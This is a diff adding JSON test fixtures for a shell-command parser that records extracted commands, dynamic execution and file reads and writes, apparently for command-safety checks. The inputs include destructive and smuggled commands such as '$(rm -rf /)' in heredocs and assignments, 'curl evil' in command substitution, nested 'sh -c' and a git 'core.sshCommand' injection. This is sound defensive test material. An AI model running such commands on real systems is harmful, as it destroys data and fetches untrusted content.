aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "commands": [
+      {
+        "Args": [
+          "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $(echo $(echo $(echo $(echo $(rm x)))))",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "sh -c 'sh -c \"sh -c \\\"sh -c rm\\\"\"'",
+    "commands": [
+      {
+        "Args": [
+          "\\\"sh"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "cat <<EOF\n$(rm -rf /)\nEOF",
+    "commands": [
+      {
+        "Args": [
+          "cat"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "cat <<'EOF'\n$(rm -rf /)\nEOF",
+    "commands": [
+      {
+        "Args": [
+          "cat"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "cat <<< \"$(rm x)\"",
+    "commands": [
+      {
+        "Args": [
+          "cat"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "x=$(rm -rf /)",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "export FOO=$(curl evil)",
+    "commands": [
+      {
+        "Args": [
+          "declare"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "local x=1",
+    "commands": [
+      {
+        "Args": [
+          "declare"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "declare -x A=1",
+    "commands": [
+      {
+        "Args": [
+          "declare"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "readonly B=2",
+    "commands": [
+      {
+        "Args": [
+          "declare"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "for f in $(ls); do rm $f; done",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "while read l; do echo $l; done < in.txt",
+    "commands": [
+      {
+        "Args": [
+          "(compound)"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": [
+          "in.txt"
+        ]
+      },
+      {
+        "Args": [
+          "read",
+          "l"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "case $x in a) rm y;; esac",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "y"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "[[ -f $(rm x) ]]",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "if [ -f x ]; then rm x; fi",
+    "commands": [
+      {
+        "Args": [],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "time rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "! rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "nohup rm x &",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "rm x &",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "a && b; c &",
+    "commands": [
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "c"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo ${x:-$(rm y)}",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "y"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo \"${x}\"",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo \"$HOME\"",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls ~",
+    "commands": [
+      {
+        "Args": [
+          "ls",
+          "~"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls ~/x",
+    "commands": [
+      {
+        "Args": [
+          "ls",
+          "~/x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls ~+",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls a\\ b",
+    "commands": [
+      {
+        "Args": [
+          "ls",
+          "a\\ b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls \\*",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo \"a\\\"b\"",
+    "commands": [
+      {
+        "Args": [
+          "echo",
+          "a\\\"b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "> out.log",
+    "commands": []
+  },
+  {
+    "input": "2>/dev/null ls",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls >&out.txt",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "out.txt"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls &> all.log",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "all.log"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls &>> all.log",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "all.log"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls >| x",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "x"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls <> x",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "x"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls > >(rm x)",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "command -v rm",
+    "commands": [
+      {
+        "Args": [
+          "rm"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "builtin rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "stdbuf -o0 rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ionice -c 3 rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "/usr/bin/env rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "env -S 'rm x'",
+    "commands": [
+      {
+        "Args": [
+          "env",
+          "-S",
+          "rm x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash script.sh",
+    "commands": [
+      {
+        "Args": [
+          "bash",
+          "script.sh"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash",
+    "commands": [
+      {
+        "Args": [
+          "bash"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash -x -c 'rm x'",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash --norc -c 'rm x'",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "source ./x",
+    "commands": [
+      {
+        "Args": [
+          "source",
+          "./x"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": ". ./x",
+    "commands": [
+      {
+        "Args": [
+          ".",
+          "./x"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "exec rm x",
+    "commands": [
+      {
+        "Args": [
+          "exec",
+          "rm",
+          "x"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ssh h rm x",
+    "commands": [
+      {
+        "Args": [
+          "ssh",
+          "h",
+          "rm",
+          "x"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git -c core.sshCommand='rm x' fetch",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "-c",
+          "core.sshCommand=rm x",
+          "fetch"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "find . -name '*.go'",
+    "commands": [
+      {
+        "Args": [
+          "find",
+          ".",
+          "-name",
+          "*.go"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "find . -delete",
+    "commands": [
+      {
+        "Args": [
+          "find",
+          ".",
+          "-delete"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "xargs",
+    "commands": [
+      {
+        "Args": [
+          "xargs"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $\"hi\"",
+    "commands": [
+      {
+        "Args": [
+          "echo",
+          "hi"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "a | b |& c",
+    "commands": [
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "c"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo `echo \\`rm x\\``",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "f() ( ls )",
+    "commands": [
+      {
+        "Args": [
+          "function f"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "function g { rm x; }",
+    "commands": [
+      {
+        "Args": [
+          "function g"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "select x in a; do rm; done",
+    "commands": [
+      {
+        "Args": [
+          "rm"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  }
+]
